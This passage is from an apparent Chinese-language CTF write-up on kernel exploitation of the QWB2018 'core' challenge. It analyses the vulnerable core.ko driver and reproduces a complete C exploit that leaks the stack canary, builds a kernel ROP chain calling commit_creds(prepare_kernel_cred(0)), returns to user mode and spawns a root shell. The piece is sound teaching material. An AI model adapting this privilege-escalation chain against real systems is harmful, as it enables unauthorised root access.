<p>为了后续调试方便，我们可以修改init文件并重新对文件系统进行打包。对init改动处有两点，首先把poweroff的部分都注释掉，然后把<code>setsid /bin/cttyhack setuidgid 1000 /bin/sh</code>中的1000改成0，从而去除了关机以及以root权限启动shell。之后重新打包。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./gen_cpio.sh ./mycore.cpio.gz</span><br><span class="line">gunzip mycore.cpio.gz</span><br><span class="line">cpio -idmv &lt; mycore.cpio</span><br></pre></td></tr></table></figure></div>
<p>之后在<strong>start.sh</strong>中把<strong>core.cpio</strong>改为<strong>mycore.cpio</strong>即可，之后启动就不会自动关机，且权限为root了。</p>
<p>然后就是看<strong>core.ko</strong>这个内核驱动模块的漏洞了。</p>
<p><strong>init_module</strong>注册了<strong>/proc/core</strong>，<strong>exit_core</strong>删除了<strong>/proc/core</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117144829081.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117144951857.png"
                      class=""
                >
<p><strong>core_ioctl</strong>这个相当于堆题的菜单，有不同的功能选项。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145051360.png"
                      class=""
                >
<p><strong>core_read</strong>从 <code>v4[off]</code> 拷贝 64
个字节到a1，a1也就是后面我们可以传入的用户空间的一个缓冲区，而且全局变量
<code>off</code> 是我们能够控制的，因此可以合理的控制 <code>off</code>
来 将canary
和一些地址读取到用户空间的缓冲区，然后再自己把这个缓冲区内的内容输出，从而能泄露内核空间的一些地址。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145312844.png"
                      class=""
                >
<p><strong>core_copy_func()</strong> 从全局变量 <code>name</code>
中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是
<code>unsigned __int16</code>，但传递的长度是
<code>signed __int64</code>，因此如果控制传入的长度为
<code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145441269.png"
                      class=""
                >
<p><strong>core_write()</strong> 向全局变量 <code>name</code>
上写，这样通过 <code>core_write()</code> 和
<code>core_copy_func()</code> 就可以控制 ropchain 了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145616435.png"
                      class=""
                >
<p>由于是第一次接触kernel
pwn的exp编写，我这里直接拿exp来进行分析学习。这里先解释一下我们exp的目的，就是提权，像什么system("/bin/sh")，我们的exp实际可以直接调用，但是拿到的只是uid=1000的普通用户的权限。我们希望通过一系列内核漏洞的利用，最终能提高权限。而且内核漏洞的exp一般都是用c语言编写的，而不是之前所学pwn用python写exp脚本。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * give_to_player [master●●] check ./core.ko</span></span><br><span class="line"><span class="comment">   ./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=549436d</span></span><br><span class="line"><span class="comment">   [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&#x27;</span></span><br><span class="line"><span class="comment">       Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">       RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">       Stack:    Canary found</span></span><br><span class="line"><span class="comment">       NX:       NX enabled</span></span><br><span class="line"><span class="comment">       PIE:      No PIE (0x0)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);            <span class="comment">//打开符号表，获取各符号偏移</span></span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))        <span class="comment">//48条项目一组，一直找commit_creds和prepare_kernel_cred符号的地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);                  <span class="comment">//地址在前16个字节</span></span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);     <span class="comment">//以llx模式解析16个字节，正确解析出地址</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中获取<strong>commit_creds</strong>等内核符号相对基址偏移的方式如下，得到偏移后，我们只要在运行exp时读取<strong>/tmp/kallsyms</strong>得到符号的真实地址，然后减去偏移之后就能得到<strong>虚拟地址符号基址</strong>。而且没有开启PIE保护下，我们可以看到内核映像默认加载基地址。这个地址是内核映像在物理内存中的加载地址，表示内核的起始位置。而<strong><code>/proc/kallsyms</code>
中的符号地址</strong>
是内核符号（如函数名、变量名等）在内核虚拟地址空间中的位置。由于 Linux
内核会进行地址空间布局随机化（ASLR），即使内核的物理地址是固定的，它在虚拟地址空间中的位置可能会有所不同。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117153339477.png"
                      class=""
                >
<p>首先我们先保存cs，rflags等信息，以便以后返回用户态。然后打开我们的内核模块core.ko中所注册的/proc/core获得一个文件描述符，那么之后就可以利用ioctl进行操作。然后我们就可以获取到核心的<strong>commit_creds</strong>和<strong>prepare_kernel_cred</strong>地址。我们的目标是调用<strong>commit_creds(prepare_kernel_cred(0));</strong>进行提权。各函数的具体实现可以看exp中的具体代码，还是比较简单的。因为我们找到的gadget等地址都是固定的物理地址空间的地址，我们想要的是虚拟空间地址，所以还要算出相对偏移。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">save_status();</span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">find_symbols();</span><br><span class="line"><span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line"><span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;		<span class="comment">//虚拟地址空间相对于物理地址空间偏移</span></span><br></pre></td></tr></table></figure></div>
<p>之后最核心的就是与注册的core设备进行交互，具体实现采用的是ioctl方式，每个函数对应之前IDA中所看到的内核模块的功能。但我们能发现core.ko中<strong>core_ioctl</strong>函数中只会调用<strong>core_read</strong>和<strong>core_copy_func</strong>，而没有<strong>core_write</strong>的调用。其实我们也可以在用户态直接<strong>write(fd,
buf, len);</strong>来调用到这个函数（fd为该设备的描述符）。</p>
<p>首先是泄露canary，我们从IDA就可以看出canary相距v4有0x40个字节。<code>copy_to_user(a1, &amp;v4[off], 64LL)</code>又能直接读出64个字节到用户空间，那么只要我们先把全局变量<strong>off</strong>设置为0x40，然后再用<strong>core_read</strong>函数，就能够将从canary开始的64个字节读取出来。也就泄露了canary。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">core_read(fd, buf);</span><br><span class="line"><span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br></pre></td></tr></table></figure></div>
<p>这里我们可以动调一下先看看，gdb从vmlinux启动，然后把core.ko作为symbol
file附加上，之后就能在想要的位置处下断点了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117165103393.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117170701255.png"
                      class=""
                >
<p>那么我们先把exp编译出来，然后重新打包文件系统，再次启动在虚拟环境下运行exp，就能用gdb进行调试。这里比如我们在<strong>core_ioctl</strong>下断点。能够成功在这里断下来。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117171647372.png"
                      class=""
                >
<p>之后我们看<strong>core_read</strong>这个具体的过程，会发现<strong>copy_to_user</strong>执行完后，rbx指向了用户态的栈区域，也成功的把内核态中的canary以及之后的64个字节复制到了用户态的栈中。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117232044372.png"
                      class=""
                >
<p>然后就是写ROP，用的是ropper找出的gadget。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br><span class="line"><span class="built_in">cat</span> g1 | grep <span class="string">&#x27;pop rdi; ret&#x27;</span>  </span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
<p>这里rop链中<code>mov rdi,rax</code>可以把<code>prepare_kernel_cred(0)</code>返回的内容作为参数传入<code>commit_creds</code>中，因为gadget中的<code>mov rdi,rax</code>后面还会call
rdx，所以前两个pop ret都是为了抵消call rdx的作用的。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br></pre></td></tr></table></figure></div>
<p>执行完<strong>core_copy_func</strong>后，就成功把rop链写在了内核的栈上</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118001545125.png"
                      class=""
                >
<p>之后我们重点看看返回用户态所用的<strong>swapgs</strong>，<strong>popfq</strong>，<strong>iretq</strong>具体做了什么。</p>
<p>首先swapgs会切换gs寄存器，先后对比如下。</p>
<img  
                     lazyload
